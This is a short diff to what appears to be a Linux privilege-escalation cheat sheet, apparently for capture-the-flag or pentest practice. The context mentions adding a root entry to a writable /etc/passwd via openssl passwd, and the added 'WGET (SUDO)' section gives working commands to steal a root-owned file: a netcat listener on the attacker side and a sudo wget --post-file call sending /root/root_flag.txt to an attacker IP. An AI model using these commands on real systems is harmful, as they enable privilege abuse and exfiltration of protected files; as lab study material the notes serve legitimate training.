@@ -84,3 +84,9 @@ If we have a writable /etc/passwd file, we can write a new line entry according 
 
 Create the password you want to add: "openssl passwd -1 -salt [salt] [password]"
 ```
+
+## WGET (SUDO)
+```
+[Attacker] Setup a NC listener for the file we want to capture: $sudo nc -nlvp 80 > root.txt
+[Victim] Send the file with wget: sudo /usr/bin/wget --post-file=/root/root_flag.txt <attacker ip>
+```
